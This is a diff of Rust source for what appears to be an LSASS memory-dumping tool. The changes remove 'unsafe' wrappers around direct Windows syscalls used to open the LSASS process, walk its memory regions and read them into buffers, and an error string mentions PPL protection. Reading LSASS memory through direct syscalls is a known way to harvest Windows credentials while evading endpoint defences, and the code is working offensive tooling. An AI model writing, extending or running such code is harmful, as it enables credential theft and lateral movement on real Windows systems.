@@ -12,9 +12,7 @@ struct HandleGuard(*mut core::ffi::c_void);
 impl Drop for HandleGuard {
     fn drop(&mut self) {
         if !self.0.is_null() {
-            unsafe {
-                let _ = dinvk::syscall!("NtClose", self.0);
-            }
+            let _ = dinvk::syscall!("NtClose", self.0);
         }
     }
 }
@@ -120,15 +118,13 @@ fn open_lsass_handle(pid: u32) -> anyhow::Result<Handle> {
         thread_id: 0,
     };
 
-    let st = unsafe {
-        dinvk::syscall!(
-            "NtOpenProcess",
-            &mut h,
-            PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
-            &oa as *const ObjectAttributes as *const c_void,
-            &cid as *const ClientId as *const c_void
-        )
-    };
+    let st = dinvk::syscall!(
+        "NtOpenProcess",
+        &mut h,
+        PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
+        &oa as *const ObjectAttributes as *const c_void,
+        &cid as *const ClientId as *const c_void
+    );
 
     if st.map(NT_SUCCESS) != Some(true) {
         anyhow::bail!("NtOpenProcess failed - PPL may be active");
@@ -174,17 +170,15 @@ fn enumerate_lsass_memory(handle: Handle) -> anyhow::Result<Vec<(u64, usize)>> {
         };
         let mut ret: usize = 0;
 
-        let st = unsafe {
-            dinvk::syscall!(
-                "NtQueryVirtualMemory",
-                handle,
-                addr as *const c_void,
-                0u32,
-                &mut mbi as *mut MemoryBasicInformation as *mut c_void,
-                size_of::<MemoryBasicInformation>(),
-                &mut ret as *mut usize
-            )
-        };
+        let st = dinvk::syscall!(
+            "NtQueryVirtualMemory",
+            handle,
+            addr as *const c_void,
+            0u32,
+            &mut mbi as *mut MemoryBasicInformation as *mut c_void,
+            size_of::<MemoryBasicInformation>(),
+            &mut ret as *mut usize
+        );
 
         if st.map(NT_SUCCESS) != Some(true) {
             break;
@@ -225,16 +219,14 @@ fn read_lsass_memory(
         let mut buf = vec![0u8; size];
         let mut read: usize = 0;
 
-        let st = unsafe {
-            dinvk::syscall!(
-                "NtReadVirtualMemory",
-                handle,
-                base as *const c_void,
-                buf.as_mut_ptr() as *mut c_void,
-                size,
-                &mut read as *mut usize
-            )
-        };
+        let st = dinvk::syscall!(
+            "NtReadVirtualMemory",
+            handle,
+            base as *const c_void,
+            buf.as_mut_ptr() as *mut c_void,
+            size,
+            &mut read as *mut usize
+        );
 
         if st.map(NT_SUCCESS) == Some(true) && read > 0 {
             buf.truncate(read);
